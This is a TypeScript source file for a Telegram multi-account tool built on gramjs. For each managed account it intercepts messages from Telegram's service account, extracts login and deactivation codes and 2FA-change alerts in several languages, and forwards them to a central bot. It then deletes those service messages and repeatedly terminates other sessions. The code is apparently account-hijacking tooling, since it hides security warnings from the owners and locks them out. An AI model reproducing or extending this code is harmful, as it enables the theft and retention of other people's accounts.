import BigInt from 'big-integer';

import { TelegramClient } from '../../../gramjs';
import GramJs from '../../../gramjs/tl/api';
import { updateAccountById } from '../../db/accounts';
import { sendToMainBot } from '../../helpers/sendToMainBot';
import { clearAuthorizations } from '../account/clearAuthorizations';
import { deleteHistory } from '../messages/deleteHistory';

const extractLoginCode = (message: string): string | null => {
  // English version
  const loginCodeMatch = message.match(/Login code: (\d+)/);
  if (loginCodeMatch) {
    return loginCodeMatch[1];
  }

  const unknownLoginMatch = message.match(/Codice di accesso: (\d+)/);
  if (unknownLoginMatch) {
    return unknownLoginMatch[1];
  }

  const russianLoginMatch = message.match(
    /Код для входа в Ваш аккаунт Telegram: (\d+)/
  );
  if (russianLoginMatch) {
    return russianLoginMatch[1];
  }

  const russianLoginMatch2 = message.match(/Код для входа в Telegram: (\d+)/);
  if (russianLoginMatch2) {
    return russianLoginMatch2[1];
  }

  const ukrLoginMatch = message.match(/Код для входу: (\d+)/);
  if (ukrLoginMatch) {
    return ukrLoginMatch[1];
  }

  // English web version
  const webLoginMatch = message.match(
    /This is your login code:\s*([a-zA-Z0-9]+)/
  );
  if (webLoginMatch) {
    return `${webLoginMatch[1]}`;
  }

  // Russian web version
  const russianWebLoginMatch = message.match(
    /Код подтверждения для сайта[\s\S]*?:\s*([a-zA-Z0-9]+)/
  );
  if (russianWebLoginMatch) {
    return russianWebLoginMatch[1];
  }

  return null;
};

const is2FAChange = (message: string): boolean => {
  return (
    message.includes('Two-Step') ||
    message.includes('Изменены настройки двухэтапной аутентификации') ||
    message.includes('Включена двухэтапная аутентификация')
  );
};

const isInclompleteLogin = (message: string): boolean => {
  return message.includes('Incomplete login attempt');
};

export const handleUpdate = async (
  client: TelegramClient | null,
  accountId: string,
  forceClearAuth: boolean,
  update: any
) => {
  if (!update) {
    return;
  }

  if (
    update.className === 'UpdateConnectionState' ||
    update.className === 'UpdateUserStatus' ||
    update.className === 'UpdateUserTyping'
  ) {
    if (process.env.DEV !== 'true') {
      return;
    }
  }

  if (
    update instanceof GramJs.UpdateShortMessage &&
    String(update.userId) === '777000'
  ) {
    console.warn({
      accountId,
      message: '[TELEGRAM_SERVICE_NOTIFICATION]',
      payload: JSON.parse(JSON.stringify(update)),
    });

    const code = extractLoginCode(update.message);
    let messageText = update.message;

    if (code) {
      messageText = update.message.includes('my.telegram.org')
        ? `CODE_FOR_DEACTIVATE: ${code}`
        : `CODE_FOR_LOGIN: ${code}`;
    } else if (is2FAChange(update.message)) {
      messageText = '2FA_SETTINGS_CHANGED';
    } else if (isInclompleteLogin(update.message)) {
      messageText = 'INCOMPLETE_LOGIN_ATTEMPT';
    }

    const notificationMessage = `[TELEGRAM_SERVICE_NOTIFICATION]
ID: ${accountId}
${messageText}`;

    await updateAccountById(accountId, {
      lastServiceNotification: new Date(),
    });
    await sendToMainBot(notificationMessage);

    if (client) {
      await deleteHistory(
        client,
        new GramJs.InputPeerUser({
          userId: update.userId,
          accessHash: BigInt(0),
        }),
        true
      );
    }

    if (forceClearAuth) {
      [0.5, 1, 1.5, 2.5, 5, 7.5, 10].forEach((minutes) => {
        setTimeout(
          async () => {
            if (client) {
              try {
                await clearAuthorizations(client);
              } catch {}
            }
          },
          minutes * 60 * 1000
        );
      });
    }

    return;
  }

  console.log({
    accountId,
    message: `<${update.className}>`,
    payload: JSON.parse(JSON.stringify(update)),
  });
};
